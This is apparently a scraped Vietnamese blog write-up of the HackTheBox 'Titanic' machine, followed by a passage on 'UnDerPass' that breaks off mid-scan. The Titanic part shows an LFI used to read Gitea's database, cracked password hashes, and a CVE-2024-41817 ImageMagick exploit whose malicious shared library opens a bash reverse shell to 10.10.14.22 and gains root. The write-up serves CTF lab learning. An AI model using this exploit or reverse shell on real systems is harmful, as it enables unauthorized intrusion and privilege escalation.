AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://titanic.htb/ Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ o file hosts\n10.10.11.55 titanic.htb Enumeration and Gaining access # Vhosts, directories # TÃ¬m cÃ¡c web path\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/titanic] â””â”€$ feroxbuster -u http://titanic.htb -s 200,301,302,403 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ¯ Target Url â”‚ http://titanic.htb ğŸš€ Threads â”‚ 50 ğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt ğŸ‘Œ Status Codes â”‚ [200, 301, 302, 403] ğŸ’¥ Timeout (secs) â”‚ 7 ğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0 ğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ğŸ” Extract Links â”‚ true ğŸ HTTP methods â”‚ [GET] ğŸ”ƒ Recursion Depth â”‚ 4 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ Press [ENTER] to use the Scan Management Menuâ„¢ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 200 GET 30l 77w 567c http://titanic.htb/static/styles.css 200 GET 2986l 7000w 469100c http://titanic.htb/static/assets/images/favicon.ico 200 GET 851l 5313w 507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg 200 GET 664l 5682w 412611c http://titanic.htb/static/assets/images/home.jpg 200 GET 890l 5324w 534018c http://titanic.htb/static/assets/images/entertainment.jpg 200 GET 859l 5115w 510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg 200 GET 156l 415w 7399c http://titanic.htb/ 403 GET 9l 28w 276c http://titanic.htb/server-status [####################] - 2m 30012/30012 0s found:8 errors:10 [####################] - 2m 30000/30000 316/s http://titanic.htb/ KhÃ´ng cÃ³ gÃ¬ nhiá»u Ä‘á»ƒ khai thÃ¡c, tÃ´i sáº½ tiáº¿p tá»¥c tÃ¬m kiáº¿m vhost. Scan láº§n Ä‘áº§u tÃ´i tháº¥y cáº§n pháº£i thÃªm redirect. Scan láº§n 2 tÃ´i Ä‘Æ°á»£c cÃ¡c vhost trÃ¹ng láº·p vá»›i size 7399. ThÃªm cÃ¡c option nÃ y Ä‘á»ƒ quÃ©t láº§n 3\nâ”Œâ”€â”€(neoã‰¿fs0c13ty)-[~/htb/machines/titanic] â””â”€$ ffuf -r -u http://titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#34;Host: FUZZ.titanic.htb\u0026#34; -fs 7399 -t 20 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://titanic.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.titanic.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 20 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 7399 ________________________________________________ dev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 196ms] ThÃªm vÃ o file host\n10.10.11.55 titanic.htb dev.titanic.htb titanic.htb # Quay trá»Ÿ láº¡i vá»›i domain chÃ­nh, lÆ°á»›t qua 1 chÃºt vá» trang nÃ y, Ä‘Ã¢y lÃ  1 trang Ä‘á»ƒ book chá»— trÃªn tÃ u titanic.\nThá»­ nháº­p cÃ¡c thÃ´ng tin vÃ  submit, vÃ© sáº½ Ä‘Æ°á»£c táº£i vá» mÃ¡y cá»§a tÃ´i dÆ°á»›i dáº¡ng file json. Xem qua file json Ä‘Æ°á»£c táº£i vá» thÃ¬ tÃ´i tháº¥y Ä‘Ãºng lÃ  nhá»¯ng gÃ¬ tÃ´i Ä‘Ã£ nháº­p, suy ra lÃ  dá»¯ liá»‡u Ä‘Æ°á»£c server xá»­ lÃ½ -\u0026gt; cÃ³ method POST.\nSá»­ dá»¥ng burpsuite Ä‘á»ƒ phÃ¢n tÃ­ch request\nNhÃ¬n tháº¥y kiá»ƒu format nÃ y lÃ m tÃ´i nghÄ© ngay Ä‘áº¿n LFI, thá»­ inject má»™t sá»‘ payload Ä‘Æ¡n giáº£n\nVáº­y lÃ  cÃ³ lá»— há»•ng LFI á»Ÿ Ä‘Ã¢y vÃ  cÃ³ 1 user tá»“n táº¡i trong server lÃ  developer. Thá»­ truy cáº­p vÃ o thÆ° má»¥c cá»§a user nÃ y xem cÃ³ láº¥y Ä‘Æ°á»£c user flag khÃ´ng.\nTÃ¬m má»™t sá»‘ file máº·c Ä‘á»‹nh nhÆ° crontab hay access.log nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£ mong Ä‘á»£i, tÃ´i sáº½ Ä‘á»ƒ nÃ³ á»Ÿ Ä‘Ã¢y vÃ  sang tiáº¿p con Ä‘Æ°á»ng thá»© 2 lÃ  vhost dev.titanic.htb\ndev.titanic.htb # Má»™t trang má»›i build báº±ng gitea phiÃªn báº£n 1.22.1. Táº¡i Ä‘Ã¢y sáº½ chia thÃ nh 2 hÆ°á»›ng khai thÃ¡c:\nTÃ¬m lá»— há»•ng cÃ³ thá»ƒ khai thÃ¡c cá»§a phiÃªn báº£n 1.22.1 Káº¿t há»£p vá»›i lá»— há»•ng LFI Ä‘Ã£ cÃ³ Ä‘á»ƒ xem ná»™i dung cÃ¡c file backend Máº¥t gáº§n ná»­a tiáº¿ng Ä‘á»ƒ Ä‘i theo hÆ°á»›ng Ä‘áº§u tiÃªn, nhÆ°ng vá»›i phiÃªn báº£n 1.22.1, tÃ´i khÃ´ng tÃ¬m tháº¥y báº¥t ká»³ lá»— há»•ng nÃ o kháº£ thi Ä‘á»ƒ cÃ³ thá»ƒ khai thÃ¡c.\nTáº­p trung vÃ o cÃ¡ch thá»© 2. Äáº§u tiÃªn tÃ´i sáº½ thá»­ Ä‘Äƒng kÃ½ 1 tÃ i khoáº£n Ä‘á»ƒ xem cÃ³ gÃ¬ bÃªn trong Gitea nÃ y khÃ´ng\nTÃ¬m Ä‘áº¿n Explore, tÃ´i cÃ³ 2 repo cá»§a user developer, má»—i repo Ä‘á»u cho tÃ´i má»™t sá»‘ thÃ´ng tin cÃ³ giÃ¡ trá»‹.\ndocker-config\nTÃ´i tÃ¬m Ä‘Æ°á»£c thÆ° má»¥c cá»§a gitea náº±m trong /home/developer. Bá» ra chÃºt thá»i gian Ä‘á»ƒ nghiÃªn cá»©u source code cá»§a Gitea trÃªn Github, tÃ´i tÃ¬m Ä‘Æ°á»£c file conf sáº½ Ä‘Æ°á»£c lÆ°u táº¡i /conf/app.ini. Káº¿t há»£p vá»›i lá»— há»•ng LFI Ä‘Ã£ cÃ³ vÃ  thá»­ má»™t sá»‘ kháº£ nÄƒng\nÄÃ¢y rá»“i! Má»Ÿ file gitea.db\nNgay á»Ÿ dÃ²ng Ä‘áº§u tÃ´i Ä‘Ã£ cÃ³ SQLite format nÃªn tÃ´i sáº½ táº£i file nÃ y vá» vÃ  má»Ÿ nÃ³ báº±ng sqlitebrowser\nTÃ¬m Ä‘áº¿n báº£ng user\nSau má»™t lÃºc láº§n mÃ² thÃ¬ tÃ´i tÃ¬m tháº¥y cÃ¡ch crack á»Ÿ Ä‘Ã¢y. Thá»­ lÃ m nhÆ° trong bÃ i xem cÃ³ Ä‘Æ°á»£c khÃ´ng.\nÄáº§u tiÃªn sá»­ dá»¥ng gitea2hashcat.py Ä‘á»ƒ láº¥y password hash theo format chuáº©n.\nî‚² ~/htb/machines/titanic î‚° sqlite3 gitea.db \u0026#39;select passwd,salt from user;\u0026#39; | python3 gitea2hashcat.py [+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256) sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY= sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y= Crack 2 hash nÃ y vá»›i hashcat\nhashcat hash /usr/share/wordlists/rockyou.txt î‚² âœ” î‚° hashcat (v6.2.6) starting in autodetect mode OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ============================================================================================================================================ * Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-1280P, 6858/13780 MB (2048 MB allocatable), 20MCU Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 10900 | PBKDF2-HMAC-SHA256 | Generic KDF NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed! Do NOT report auto-detect issues unless you are certain of the hash type. Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 2 digests; 2 unique digests, 2 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Slow-Hash-SIMD-LOOP Watchdog: Hardware monitoring interface not found on your system. Watchdog: Temperature abort trigger disabled. Host memory required for this attack: 5 MB Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528 Privilege escalation # Login vÃ o user nÃ y\n~/htb/machines/titanic ssh developer@10.10.11.55 developer@10.10.11.55\u0026#39;s password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Thu Mar 27 04:51:54 PM UTC 2025 System load: 0.29 Usage of /: 84.8% of 6.79GB Memory usage: 21% Swap usage: 0% Processes: 230 Users logged in: 0 IPv4 address for eth0: 10.10.11.55 IPv6 address for eth0: dead:beef::250:56ff:feb9:f50f Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Mar 27 16:43:33 2025 from 10.10.14.41 developer@titanic:~$ id uid=1000(developer) gid=1000(developer) groups=1000(developer) Táº£i linpeas.sh lÃªn mÃ¡y nÃ y vÃ  Ä‘á»ƒ nÃ³ phÃ¢n tÃ­ch\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Running processes (cleaned) â•š Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users develop+ 458935 0.0 0.1 9196 5672 pts/1 Ss 16:53 0:00 -bash develop+ 459181 0.1 0.0 4476 3360 pts/1 S+ 17:00 0:00 _ /bin/sh ./linpeas.sh develop+ 480673 73.5 0.0 7788 3212 pts/1 R+ 17:02 0:01 _ find / -type f ( -name *backup* -o -name *.bak -o -name *.bak.* -o -name *.bck -o -name *.bck.* -o -name *.bk -o -name *.bk.* -o -name *.old -o -name *.old.* ) -not -path /proc/* develop+ 458795 0.0 0.1 8908 5764 pts/0 Ss 16:51 0:00 -bash develop+ 464406 0.0 0.0 3948 2716 pts/0 S+ 17:01 0:00 _ /bin/sh ./linpeas.sh develop+ 480734 0.0 0.0 3948 1148 pts/0 S+ 17:02 0:00 _ /bin/sh ./linpeas.sh develop+ 480738 0.0 0.0 10044 1592 pts/0 R+ 17:02 0:00 | _ ps fauxwww develop+ 480737 0.0 0.0 3948 1148 pts/0 S+ 17:02 0:00 _ /bin/sh ./linpeas.sh develop+ 1738 0.0 4.3 1403008 170892 ? Ssl 12:52 0:12 /usr/local/bin/gitea web develop+ 458718 0.0 0.2 17204 9928 ? Ss 16:51 0:00 /lib/systemd/systemd --user develop+ 462179 0.0 0.1 8300 4252 ? Ss 17:01 0:00 _ /usr/bin/dbus-daemon[0m --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only develop+ 1156 2.8 0.8 1065000 33360 ? Ss 12:51 7:09 /usr/bin/python3 /opt/app/app.py CÃ³ 1 thÆ° má»¥c trong /opt\ndeveloper@titanic:/opt$ ll total 20 drwxr-xr-x 5 root root 4096 Feb 7 10:37 ./ drwxr-xr-x 19 root root 4096 Feb 7 10:37 ../ drwxr-xr-x 5 root developer 4096 Feb 7 10:37 app/ drwx--x--x 4 root root 4096 Feb 7 10:37 containerd/ drwxr-xr-x 2 root root 4096 Feb 7 10:37 scripts/ Chá»‰ chá»‰ cÃ³ app/ vÃ  scripts cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c\ndeveloper@titanic:/opt$ ll scripts/ total 12 drwxr-xr-x 2 root root 4096 Feb 7 10:37 ./ drwxr-xr-x 5 root root 4096 Feb 7 10:37 ../ -rwxr-xr-x 1 root root 167 Feb 3 17:11 identify_images.sh* developer@titanic:/opt/scripts$ cat identify_images.sh cd /opt/app/static/assets/images truncate -s 0 metadata.log find /opt/app/static/assets/images/ -type f -name \u0026#34;*.jpg\u0026#34; | xargs /usr/bin/magick identify \u0026gt;\u0026gt; metadata.log File nÃ y thuá»™c sá»Ÿ há»¯u cá»§a root nhÆ°ng ai cÅ©ng cÃ³ thá»ƒ cháº¡y Ä‘Æ°á»£c. TÃ´i sáº½ lá»£i dá»¥ng Ä‘iá»u nÃ y Ä‘á»ƒ thá»­ leo thang Ä‘áº·c quyá»n. Script nÃ y cÃ³ sá»­ dá»¥ng 1 tool lÃ  magick. TÃ´i sáº½ tÃ¬m cÃ¡ch lá»£i dá»¥ng nÃ³\ndeveloper@titanic:/opt/scripts$ /usr/bin/magick -help Usage: magick tool [ {option} | {image} ... ] {output_image} Usage: magick [ {option} | {image} ... ] {output_image} magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...] magick -help | -version | -usage | -list {option} developer@titanic:/opt/scripts$ /usr/bin/magick -version Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff png x xml zlib Compiler: gcc (9.4) TÃ¬m kiáº¿m lá»— há»•ng cá»§a phiÃªn báº£n nÃ y, tÃ´i cÃ³ CVE-2024-41817\nLÃ m tá»«ng bÆ°á»›c theo PoC nÃ y. TÃ´i sáº½ thÃªm 1 payload vá»›i command Ä‘Æ¡n giáº£n id Ä‘á»ƒ kiá»ƒm tra xem magick cÃ³ cháº¡y Ä‘Æ°á»£c khÃ´ng.\ndeveloper@titanic:~$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - \u0026lt;\u0026lt; EOF #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__((constructor)) void init(){ system(\u0026#34;id\u0026#34;); exit(0); } EOF developer@titanic:~$ ll libxcb.so.1 -rwxrwxr-x 1 developer developer 15616 Mar 31 08:55 libxcb.so.1* developer@titanic:~$ /usr/bin/magick uid=1000(developer) gid=1000(developer) groups=1000(developer) Váº­y lÃ  payload thá»±c hiá»‡n thÃ nh cÃ´ng. TÃ´i sáº½ thay Ä‘á»•i payload thÃ nh revershell.\nTrÆ°á»›c Ä‘Ã³ thÃ¬ báº­t listener.\nneo@fs0c13ty ~$ nc -lnvp 9001 listening on [any] 9001 ... developer@titanic:~$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - \u0026lt;\u0026lt; EOF #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__((constructor)) void init(){ system(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp;/dev/tcp/10.10.14.22/9001 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); exit(0); } EOF neo@fs0c13ty ~$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.22] from (UNKNOWN) [10.10.11.55] 47498 bash: cannot set terminal process group (3480): Inappropriate ioctl for device bash: no job control in this shell root@titanic:/opt/app/static/assets/images# id id uid=0(root) gid=0(root) groups=0(root) root@titanic:/opt/app/static/assets/images# cd cd root@titanic:~# ls ls cleanup.sh images revert.sh root.txt snap ","date":"3 March 2025","externalUrl":null,"permalink":"/ctf/hackthebox/titanic/","section":"Ctf","summary":"","title":"Hackthebox - Titanic","type":"ctf"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/magick/","section":"Tags","summary":"","title":"Magick","type":"tags"},{"content":"","date":"1 February 2025","externalUrl":null,"permalink":"/tags/cron/","section":"Tags","summary":"","title":"Cron","type":"tags"},{"content":"","date":"1 February 2025","externalUrl":null,"permalink":"/tags/daloradius/","section":"Tags","summary":"","title":"Daloradius","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo= | 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu)) |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Thá»­ truy cáº­p port 80 vÃ  thá»­ má»™t sá»‘ cÃ¡ch thá»©c Ä‘Æ¡n giáº£n Ä‘á»ƒ khai thÃ¡c web nÃ y, nhÆ°ng vá» cÆ¡ báº£n lÃ  tÃ´i khÃ´ng tÃ¬m tháº¥y Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t.\nSau má»™t lÃºc tÃ¬m kiáº¿m loanh quanh thÃ¬ tÃ´i lÆ°á»›t Ä‘áº¿n port 161 trÃªn Hacktricks, vÃ  tÃ´i nghÄ© Ä‘áº¿n UDP Scan\nTÃ´i sáº½ thá»­ scan má»™t sá»‘ port UDP thÃ´ng dá»¥ng\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb-overpass] â””â”€$ nmap -sU -p35,161,137,138,69 -sV 10.10.11.48 -oN nmap-udp Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 10:35 EST Nmap scan report for 10.10.11.48 Host is up (0.23s latency). PORT STATE SERVICE VERSION 35/udp closed priv-print 69/udp closed tftp 137/udp closed netbios-ns 138/udp closed netbios-dgm 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) Service Info: Host: UnDerPass.htb is the only daloradius server in the basin! Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds Váº­y lÃ  tÃ´i cÃ³ port 161 Ä‘ang má»Ÿ\nEnumeration and Gaining access # Sá»­ dá»¥ng snmpwalk\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb-overpass] â””â”€$ snmpwalk -v 1 -c public underpass.htb iso.3.6.1.2.1.1.1.0 = STRING: \u0026#34;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64\u0026#34; iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (10535620) 1 day, 5:15:56.20 iso.3.6.1.2.1.1.4.0 = STRING: \u0026#34;steve@underpass.htb\u0026#34; iso.3.6.1.2.1.1.5.0 = STRING: \u0026#34;UnDerPass.htb is the only daloradius server in the basin!\u0026#34; iso.3.6.1.2.1.1.6.0 = STRING: \u0026#34;Nevada, U.S.A. but not Vegas\u0026#34; iso.3.6.1.2.1.1.7.0 = INTEGER: 72 iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1 iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1 iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1 iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1 iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1 iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49 iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50 iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92 iso.3.6.1.2.1.1.9.1.3.1 = STRING: \u0026#34;The SNMP Management Architecture MIB.\u0026#34; iso.3.6.1.2.1.1.9.1.3.2 = STRING: \u0026#34;The MIB for Message Processing and Dispatching.\u0026#34; iso.3.6.1.2.1.1.9.1.3.3 = STRING: \u0026#34;The management information definitions for the SNMP User-based Security Model.\u0026#34; iso.3.6.1.2.1.1.9.1.3.4 = STRING: \u0026#34;The MIB module for SNMPv2 entities\u0026#34; iso.3.6.1.2.1.1.9.1.3.5 = STRING: \u0026#34;View-based Access Control Model for SNMP.\u0026#34; iso.3.6.1.2.1.1.9.1.3.6 = STRING: \u0026#34;The MIB module for managing TCP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.7 = STRING: \u0026#34;The MIB module for managing UDP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.8 = STRING: \u0026#34;The MIB module for managing IP and ICMP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.9 = STRING: \u0026#34;The MIB modules for managing SNMP Notification, plus filtering.\u0026#34; iso.3.6.1.2.1.1.9.1.3.10 = STRING: \u0026#34;The MIB module for logging SNMP Notifications.\u0026#34; iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.25.1.1.0 = Timeticks: (10537637) 1 day, 5:16:16.37 iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 09 0F 19 29 00 2B 00 00 iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216 iso.3.6.1.2.1.25.1.4.0 = STRING: \u0026#34;BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0 \u0026#34; iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0 iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0 End of MIB TÃ´i nháº­n Ä‘Æ°á»£c 1 email steve@underpass.htb vÃ  daloradius server.\nTÃ¬m kiáº¿m thÃ´ng tin vá» daloradius server, daloRADIUS lÃ  má»™t giao diá»‡n web mÃ£ nguá»“n má»Ÿ Ä‘á»ƒ quáº£n lÃ½ FreeRADIUS, giÃºp ngÆ°á»i dÃ¹ng dá»… dÃ ng quáº£n lÃ½ tÃ i khoáº£n, phiÃªn Ä‘Äƒng nháº­p, log vÃ  bÃ¡o cÃ¡o cá»§a há»‡ thá»‘ng RADIUS. NÃ³ Ä‘Æ°á»£c viáº¿t báº±ng PHP vÃ  há»— trá»£ cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL, PostgreSQL, SQLite.\nKiá»ƒm tra mÃ£ nguá»“n cá»§a nÃ³, tÃ´i tÃ¬m tháº¥y 1 sá»‘ path mÃ  cÃ³ thá»ƒ há»¯u Ã­ch: trong /app cÃ³ /users. Tuy nhiÃªn truy cáº­p trÃªn web thÃ¬ khÃ´ng cÃ³ path nÃ y\nThá»­ má»™t sá»‘ path khÃ¡c thÃ¬ tÃ´i nháº­n Ä‘Æ°á»£c\nSá»­ dá»¥ng feroxbuster\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/htb-overpass] â””â”€$ feroxbuster -u http://underpass.htb/daloradius ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher ğŸ¤“ ver: 2.11.0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ¯ Target Url â”‚ http://underpass.htb/daloradius ğŸš€ Threads â”‚ 50 ğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt ğŸ‘Œ Status Codes â”‚ All Status Codes! ğŸ’¥ Timeout (secs) â”‚ 7 ğŸ¦¡ User-Agent â”‚ feroxbuster/2.11.0 ğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ğŸ” Extract Links â”‚ true ğŸ HTTP methods â”‚ [GET] ğŸ”ƒ Recursion Depth â”‚ 4 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ Press [ENTER] to use the Scan Management Menuâ„¢ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 404 GET 9l 31w 275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 403 GET 9l 28w 278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 